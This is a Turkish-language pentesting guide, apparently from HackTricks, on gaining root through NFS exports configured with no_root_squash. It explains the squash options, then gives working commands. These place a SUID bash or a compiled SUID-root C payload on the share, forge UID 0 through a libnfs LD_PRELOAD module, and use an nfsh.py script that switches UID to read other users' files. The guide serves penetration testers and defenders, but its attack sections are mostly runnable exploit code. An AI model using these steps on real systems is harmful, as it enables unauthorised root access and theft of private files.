# NFS No Root Squash Misconfiguration Privilege Escalation

## Squashing Temel Bilgiler

NFS AUTH_SYS/AUTH_UNIX ile sunucu, dosya izin kontrollerini her RPC isteğinde gönderilen `uid` ve `gid` değerlerine göre yapar. Kerberos gibi diğer security flavor'lar farklı kimlik bilgileri kullanır ve sunucu, izinleri kontrol etmeden önce sayısal kimlik bilgilerini eşleyebilir.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Her UID ve GID'yi varsayılan olarak Linux'ta `nobody` (65534) olan anonymous hesaba eşler. `no_all_squash`, root olmayan istekler için varsayılandır.<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux'ta varsayılandır ve UID/GID 0 (root) içeren istekleri anonymous hesaba eşler; diğer UID ve GID'ler squash edilmez.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Root squashing'i devre dışı bırakır; böylece UID/GID 0 içeren istekler sunucuda root olarak değerlendirilebilir.<sup>[[4]](#references)</sup>

İzin verilen bir client, **`no_root_squash`** ile yapılandırılmış, yazılabilir bir export'u **`/etc/exports`** içinde mount edebiliyorsa UID/GID 0 istekleri sunucunun root kullanıcısı olarak buraya yazabilir.<sup>[[4]](#references)</sup>

**NFS** hakkında daha fazla bilgi için:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Bash kullanarak Option 1:
- İzin verilen bir client üzerinde yazılabilir bir export'u root olarak mount edin, **`/bin/bash`** dosyasını buraya kopyalayın, **`SUID`** bit'ini ayarlayın ve `nosuid` kullanmayan bir victim mount'ından çalıştırın.<sup>[[2]](#references)[[4]](#references)</sup>
- Yüklenen dosyanın sahibi root olarak kalması için sunucu **`no_root_squash`** kullanmalıdır. Root squash edilirse başka bir hesap için SUID binary'si, yalnızca client bu dosyayı o hesabın sayısal UID/GID'siyle meşru şekilde oluşturabiliyor veya sahibi olabiliyorsa mümkündür.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Derlenmiş C kodu kullanarak 2. seçenek:
- Dizini izin verilen bir istemciden mount edin, SUID izinlerini kötüye kullanan derlenmiş bir payload kopyalayın, **SUID** bitini ayarlayın ve victim üzerinde çalıştırın (bazı [C SUID payload'larına](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) bakın).
- Önceki kısıtlamaların aynısı
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Makinenizden victim machine'e bir **tunnel oluşturabiliyorsanız, gerekli portları tunnelling ederek bu privilege escalation işlemini gerçekleştirmek için Remote version'ı hâlâ kullanabilirsiniz**.\
> Aşağıdaki trick, `/etc/exports` export'u victim'ın IP'siyle sınırlandırdığında kullanışlıdır: remote client bunu mount edemez, ancak local technique, izin verilen host üzerinde zaten mount edilmiş share üzerinden çalışabilir.<sup>[[2]](#references)</sup>\
> Bu unprivileged libnfs method'u için **`/etc/exports`** içindeki export, process'in non-reserved bir source port kullanabilmesi amacıyla `insecure` flag'ini kullanmalıdır; `secure` varsayılandır, ancak reserved bir port'a bind edebilen bir process bu seçeneğe ihtiyaç duymaz.<sup>[[1]](#references)[[4]](#references)</sup>

### Basic Information

Bir NFSv3 AUTH_UNIX client, her çağrıda effective UID, GID ve gruplarını gönderir ve server bunları permission check'leri için kullanır. Bu local technique, [libnfs](https://github.com/sahlberg/libnfs) aracılığıyla RPC credentials'ı forge ederek bu modeli abuse eder; preload module, NFS context içindeki UID/GID'nin override edilmesini destekler.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compiling the Library

libnfs example'ı target kernel için adjustments gerektirebilir; burada kullanılan walkthrough, preload module'ü compile etmeden önce fallocate syscall'larının comment'lenmesi gerektiğini özellikle belirtir.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit'in Gerçekleştirilmesi

Örnek, bir shell başlatan küçük bir C yardımcı programı oluşturur; ardından bunu share üzerine yerleştirir ve NFS context içinde UID 0 ile `ld_nfs.so` kullanarak SUID-root olmasını sağlar.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit kodunu derleyin:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Exploit'i paylaşım üzerine yerleştirin ve UID'yi sahteleyerek izinlerini değiştirin**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **root privileges elde etmek için exploit'i çalıştırın**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: Gizli Dosya Erişimi için NFShell

Root erişimi elde edildikten sonra bu `nfsh.py` pattern'i, bir komutu çalıştırmadan önce effective UID'yi hedef dosyanın UID'sine ayarlar ve ownership'i recursive olarak değiştirmeden erişime olanak tanır.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Şöyle çalıştırın:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Daha az bilinen bir NFS privesc hikayesi](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
